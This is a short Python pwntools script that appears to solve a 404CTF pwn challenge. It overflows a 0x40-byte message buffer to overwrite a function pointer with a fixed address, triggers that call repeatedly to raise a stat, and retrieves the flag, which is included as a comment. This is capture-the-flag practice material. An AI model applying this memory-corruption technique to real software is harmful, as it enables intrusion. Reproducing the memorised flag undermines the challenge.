from pwn import *

HOST = "challenges.404ctf.fr"
PORT = 30944

r = remote(HOST, PORT)

def recv_prompt(r):
    data = r.recvuntil(b">>> ")
    print(data.decode())

def recv_carac(r):
    r.sendline(b"4")
    carac = r.recvuntil(b">>> ")
    print(carac.decode())

def recv_flag(r):
    r.sendline(b"5")
    flag = r.recvuntil(b"}")
    print(flag.decode())

recv_prompt(r)
incInt_addr = 0x4008d5
intelligence_payload = b'A'*0x40 + p64(incInt_addr)

assert len(intelligence_payload) == 0x48

for _ in range(5):
    # Buy strength potion
    r.sendline(b"1")
    recv_prompt(r)
    # Consume it
    r.sendline(b"2")
    recv_prompt(r)

recv_carac(r)

for _ in range(10):
    # Send message in which we inject incInt function address
    r.sendline(b"3")
    r.recvuntil(b" : ")
    r.sendline(intelligence_payload)
    recv_prompt(r)
    # Consume it (will call the function at the injected address)
    r.sendline(b"2")
    recv_prompt(r)

recv_carac(r)

recv_flag(r)
# Flag: 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}
